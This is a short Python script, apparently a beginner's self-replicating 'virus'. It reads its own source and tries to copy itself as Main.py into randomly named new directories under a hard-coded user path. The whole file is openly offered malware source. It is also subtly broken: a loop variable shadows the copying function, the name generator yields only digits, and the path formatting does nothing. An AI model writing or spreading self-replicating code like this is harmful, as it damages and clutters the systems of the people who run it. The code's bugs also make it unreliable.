import os
import random


code = __file__

fichier = open(code,'r')
virus = fichier.read()
fichier.close()


utilisateur = os.getlogin()
chemin = r'/Users/kevinnelson/Downloads/Python/Youtube/'.format(utilisateur)

def replication(fichier):
    os.chdir(fichier)
    fichier = open('Main.py','w+')
    fichier.write(virus)
    fichier.close()
    os.chdir(chemin)
    
nombre_iteration = 5
alphabet = "abcdefghijklmnopqrstuvwxyz"
nombres = "0123456789"
taille = [2,4,6,8,10]

for replication in range(nombre_iteration):
    size = random.choice(taille)
    compt = 0
    bulk = ""
    for _ in range(size):
        if compt != 0:
            compt += 1
            bulk += random.choice(alphabet)
        else:
            bulk += random.choice(nombres)
    try:
        os.mkdir(bulk)
        replication(bulk)
        
    except Exception as Error:
        print(Error)